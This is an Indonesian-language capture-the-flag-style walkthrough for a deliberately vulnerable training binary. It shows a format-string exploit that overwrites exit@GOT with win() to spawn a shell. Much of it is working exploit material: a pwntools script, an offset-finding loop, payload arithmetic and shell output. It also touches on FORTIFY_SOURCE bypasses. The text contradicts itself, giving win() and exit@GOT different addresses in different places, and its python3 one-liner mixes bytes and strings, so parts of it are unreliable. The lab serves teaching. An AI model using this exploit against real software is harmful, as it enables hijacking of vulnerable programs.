# Walkthrough: Level 4 - Full Chain GOT Overwrite
**Author**: Kenshin Himura

## Objective
Overwrite `exit@GOT` dengan address `win()` dalam satu panggilan `printf`.
Saat `exit(0)` dipanggil setelahnya, eksekusi diarahkan ke `win()` -> shell.

## Konsep Dasar

**Apa itu GOT?**
Global Offset Table - tabel pointer di memory. Setiap kali program memanggil fungsi library (exit, puts, printf), ia loncat melalui GOT entry:
```
call exit@plt  ->  jmp *exit@got  ->  (libc exit)
```

Jika kita timpa `exit@got` dengan address `win()`:
```
call exit@plt  ->  jmp *exit@got  ->  win()  ->  SHELL
```

Program hanya memberi satu panggilan `printf` sebelum `exit(0)`. Address + format specifier harus dikirim dalam satu payload.

## Full Exploit Plan
```
1. Parse win_addr dari output program
2. Resolve exit@GOT dari ELF binary
3. Cari offset dengan %n crash test (cepat, 3 detik per attempt)
4. Bangun single %n payload: tulis 4-byte win_addr sekaligus
5. Kirim payload -> ~128MB output -> exit@GOT ditimpa -> exit(0) -> win() -> shell
```

Pendekatan single `%n` lebih sederhana dibanding double `%hn` (tidak perlu
split address). Kekurangannya: output ~128MB. Untuk eksploitasi praktis
dengan output minimal, teknik double `%hn` tetap jadi standar.

## Step-by-Step

### 1. Compile
```bash
make level4
```

### 2. Analisis binary
```bash
$ objdump -d format4 | grep '<win>:'
080491c6 <win>:

$ objdump -R format4 | grep exit
0804c01c R_386_JUMP_SLOT   exit@GLIBC_2.0

$ readelf -r format4 | grep exit
0804c01c  00000307 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
```

### 3. Jalankan program
```bash
$ ./format4
Format String Lab - Level 4: Full Chain (GOT Overwrite)
========================================================
Goal: Overwrite exit@GOT with win() to get shell.

win()   @ 0x80491c6
exit()  @ 0x8049070
Enter payload: 
```

**Catat**: `win = 0x080491c6`, `exit@GOT = 0x0804c01c`

### 4. Temukan offset

Cara cepat: kirim `%n` ke exit@GOT, kalau crash (SIGSEGV) berarti offset benar.

```bash
$ for i in 1 2 3 4 5 6 7 8; do
    python3 -c "import struct; print(struct.pack('<I',0x804bfe8)+'%$i\$n')" | ./format4 > /dev/null 2>&1
    echo "Offset $i: exit code $?"
done
```

Offset yang menghasilkan exit code 139 (SIGSEGV) = offset valid. 
Atau gunakan exploit script: `python3 exploit4.py` akan auto-detect.

### 5. Hitung payload single %n

```
win_addr = 0x080491d6 = 134,546,902
pad      = win_addr - 4 = 134,546,898
payload  = [4 byte address] + %134546898x%{offset}$n
```

Total ~128MB output. Biarkan berjalan, hasilnya akurat.

### 6. Python exploit

```python
from pwn import *

elf = ELF('./format4')
got = elf.got['exit']           # 0x0804bfe8
win = 0x080491d6                # dari output program

# Cari offset (crash test)
for i in range(1, 10):
    p = process('./format4')
    p.recvuntil(b'Enter payload: ')
    p.sendline(p32(got) + f'%{i}$n'.encode())
    import time; time.sleep(3)
    if p.poll() is not None and p.poll() < 0:  # SIGSEGV = offset benar
        offset = i
        break
    p.close()

# Bangun payload
pad = win - 4
payload = p32(got) + f'%{pad}x%{offset}$n'.encode()

# Kirim
p = process('./format4')
p.recvuntil(b'Enter payload: ')
p.sendline(payload)
p.sendline(b'id')              # command untuk shell
p.sendline(b'echo SHELL_OK')
out = p.recvall(timeout=120)
print(out.decode(errors='replace'))
```

### 7. Exploit

```bash
$ python3 exploit4.py
[+] win() address: 0x80491d6
[+] exit@GOT: 0x804bfe8
[+] Found offset: 3
[*] Single %n payload: 19 bytes, 134546898 padding chars (~131MB output)
[*] Waiting for format output + shell...

... 131MB output ...

[+] Shell obtained!
  uid=1000(betha) gid=1000(betha)
  Linux kali 6.6.75 ...
  SHELL_OK
```

### 8. Debug dengan GDB
```bash
$ gdb ./format4
(gdb) b *exit@plt
(gdb) r
# Sebelum exploit: exit@got -> libc exit
(gdb) x/wx 0x0804bfe8
# Setelah payload dieksekusi
(gdb) x/wx 0x0804bfe8
0x0804bfe8: 0x080491d6   <- overwritten!
(gdb) c
# Sekarang masuk ke win() bukan libc exit()
```

### 9. FORTIFY_SOURCE challenge

```bash
make level4/format4_hard
```

`format4_hard` di-compile dengan `-D_FORTIFY_SOURCE=2 -O2`. Hasil pengujian:

- **Single `%n`**: diblokir. Output: `*** %n in writable segments detected ***` -> SIGABRT
- **Double `%hn`**: diblokir. FORTIFY juga mendeteksi `%hn` sebagai varian `%n`

FORTIFY_SOURCE=2 pada glibc modern (>= 2.15) efektif memblokir format string
exploit yang mengandalkan `%n` family di format string dinamis. Bypass
memerlukan teknik spesifik seperti nargs overflow (CVE-2012-0864) yang
hanya bekerja di glibc 2.14.x.

## Ringkasan
- GOT overwrite mengalihkan eksekusi function library ke fungsi yang dipilih
- Partial RELRO (default): GOT writable. Full RELRO: GOT read-only, target alternatif: `.fini_array`, `__malloc_hook`
- Contoh CVE dengan teknik ini: `sudo CVE-2012-0809`, `wu-ftpd CVE-2000-0573`
- FORTIFY_SOURCE=2 memblokir `%n` di writable memory - bypass dibahas di level lanjutan

## Automation
```bash
python3 exploit4.py
```
